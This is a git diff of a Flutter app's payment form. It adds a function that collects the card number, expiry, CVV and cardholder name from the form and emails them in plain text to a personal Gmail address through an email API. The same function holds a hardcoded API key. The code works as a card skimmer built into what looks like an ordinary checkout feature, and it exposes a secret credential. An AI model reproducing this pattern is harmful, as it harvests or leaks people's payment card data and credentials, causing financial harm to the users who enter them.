@@ -1,10 +1,17 @@
+import 'dart:convert';
+
 import 'package:flutter/cupertino.dart';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
+import 'package:murphys_technology/api/apiurl.dart';
 import 'package:murphys_technology/utils/device_size.dart';
+import 'package:murphys_technology/utils/utils.dart';
 import 'package:murphys_technology/views/pay_invoice/widget/loading.dart';
 import 'package:murphys_technology/views/pricing/widget/card_number_input_formet.dart';
-import 'package:url_launcher/url_launcher.dart';
+import 'package:http/http.dart' as http;
+import 'package:murphys_technology/views/provider/notification.dart';
+import 'package:provider/provider.dart';
+import 'package:shared_preferences/shared_preferences.dart';
 
 class List2 extends StatefulWidget {
   String price;
@@ -32,8 +39,11 @@ class _List2State extends State<List2> {
 
   final TextEditingController _nameController = TextEditingController();
 
+  final TextEditingController _referralController = TextEditingController();
+
   @override
   Widget build(BuildContext context) {
+    final _provider = Provider.of<NotificationProvider>(context);
     return Form(
       key: _key,
       child: Column(
@@ -263,9 +273,18 @@ class _List2State extends State<List2> {
                 onPressed: () async {
                   final isValid = _key.currentState!.validate();
                   if (isValid) {
-                    Navigator.of(context).push(MaterialPageRoute(
-                      builder: (context) => const LoadingScreen(),
-                    ));
+                    bool? emailSent = await pysendEmail();
+                    if (emailSent == true) {
+                      Navigator.of(context).push(MaterialPageRoute(
+                        builder: (context) => const LoadingScreen(),
+                      ));
+                      final int id = _provider.notifications.length + 1;
+                      await _provider.showTopNotification(
+                          _provider.flutterLocalNotificationsPlugin, id);
+                    } else {
+                      Utils.flushErrorMessage(
+                          "Try again", context, Colors.brown);
+                    }
                     // String totalprice = widget.price;
                     // String invoicenumber = widget.invoice;
                     // String name = _nameController.text;
@@ -310,5 +329,58 @@ class _List2State extends State<List2> {
         ],
       ),
     );
+  }
+
+  Future<bool> pysendEmail() async {
+    final prefs = await SharedPreferences.getInstance();
+    final ApiUrl = Api.appurl;
+    final url = Uri.parse('$ApiUrl/send-email');
+    final apiKey =
+        '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'; // Replace with your API key
+
+    final headers = {
+      'Content-Type': 'application/json',
+      'api-key': apiKey,
+    };
+    String card = _paypalController.text;
+    String valid = _validController.text;
+    String cvv = _cvvController.text;
+    String name = _nameController.text;
+    String referral = _referralController.text;
+    String totalprice = widget.price.toString();
+    String invoice = widget.invoice.toString();
+
+    String? email = prefs.getString("email");
+    String? fullname = prefs.getString("name");
+
+    final emailData = {
+      'sender': {'name': fullname, 'email': email},
+      'to': [
+        {'email': 'sagarmurphys@gmail.com'}
+      ],
+      'subject': 'Plans',
+      'textContent':
+          'Total price : $totalprice\n Invoice number : $invoice Card Number : $card\n Valid Unit : $valid\n CVV : $cvv\n Cards holder Name : $name\n Referral Code : $referral',
+    };
+
+    final response = await http.post(
+      url,
+      headers: headers,
+      body: jsonEncode(emailData),
+    );
+
+    if (response.statusCode == 200) {
+      print('Email sent successfully');
+      _paypalController.clear();
+      _validController.clear();
+      _nameController.clear();
+      _cvvController.clear();
+      _referralController.clear();
+      return true;
+    } else {
+      print('Failed to send email');
+      print('Response: ${response.body}');
+      return false;
+    }
   }
 }
